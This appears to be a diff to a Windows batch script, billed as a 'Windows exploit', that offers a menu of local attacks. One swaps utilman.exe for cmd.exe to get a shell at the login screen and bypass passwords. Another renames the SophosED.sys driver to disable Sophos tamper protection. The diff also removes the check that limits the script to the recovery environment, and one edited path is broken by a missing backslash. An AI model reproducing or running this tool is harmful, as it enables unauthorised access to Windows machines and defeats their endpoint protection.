@@ -15,7 +15,7 @@ if /i "%CD:~0,2%" NEQ "X:" (
   echo You must be in the Installer/Recovery environment to run this script!
   pause
   cls
-  exit /b 1
+  rem exit /b 1
 )
 
 :menu
@@ -23,7 +23,7 @@ cls
 echo ^|==============================^|
 echo ^|  WINDOWS EXPLOIT BY S1rDyn0  ^|
 echo ^|                              ^|
-echo ^|  Version             23.5.1  ^|
+echo ^|  BUILD               23.5.4  ^|
 echo ^|==============================^| & echo: & echo:
 echo ^[1^] Local Password Exploit
 echo ^[2^] Disable Sophos Tamper Protection
@@ -58,14 +58,12 @@ if %crackType% EQU 1 (
   echo Starting Hack
   if /i exist "c:\windows\system32" (
     echo System Directory Found
-    cd "c:\windows\system32"
-    echo Changed current working directory
 
     echo Renaming utilman.exe to utilman.old
-    ren utilman.exe utilman.old || goto cmdFail
+    ren C:\windows\system32\utilman.exe utilman.old || goto cmdFail
 
     echo Copying cmd.exe to utilman.exe
-    copy cmd.exe utilman.exe || goto cmdFail
+    copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto cmdFail
 
     echo -----------------------------------
     echo Exploit Completed ^| No errors
@@ -84,10 +82,9 @@ if %crackType% EQU 2 (
   echo Starting Hack
   if /i exist "c:\windows\system32\drivers" (
     echo System Directory Found
-    cd "c:\windows\system32\drivers"
     
     echo Renaming SophosED.sys to SophosED.sys.old
-    ren SophosED.sys SophosED.sys.old || goto cmdFail
+    ren C:\windows\system32\driversSophosED.sys SophosED.sys.old || goto cmdFail
 
     echo -----------------------------------
     echo Exploit Completed ^| No errors
@@ -106,21 +103,18 @@ if %crackType% EQU 3 (
   echo Starting Hack
   if /i exist "c:\windows\system32" (
     echo System Directory Found
-    cd "c:\windows\system32"
-    echo Changed current working directory
 
     echo Renaming utilman.exe to utilman.old
-    ren utilman.exe utilman.old || goto cmdFail
+    ren C:\windows\system32\utilman.exe utilman.old || goto cmdFail
 
     echo Copying cmd.exe to utilman.exe
-    copy cmd.exe utilman.exe || goto cmdFail
+    copy C:\windows\system32\cmd.exe C:\windows\system32\utilman.exe || goto cmdFail
 
     if /i exist "c:\windows\system32\drivers" (
       echo System Directory Found
-      cd "c:\windows\system32\drivers"
       
       echo Renaming SophosED.sys to SophosED.sys.old
-      ren SophosED.sys SophosED.sys.old || goto cmdFail
+      ren C:\windows\system32\driversSophosED.sys SophosED.sys.old || goto cmdFail
 
       echo -----------------------------------
       echo Exploit Completed ^| No errors
@@ -142,7 +136,7 @@ if %crackType% EQU 3 (
 )
 
 if %crackType% EQU 4 (
-  start "" "c:/windows/system32/osk.exe"
+  "c:/windows/system32/osk.exe"
 )
 
 goto menu
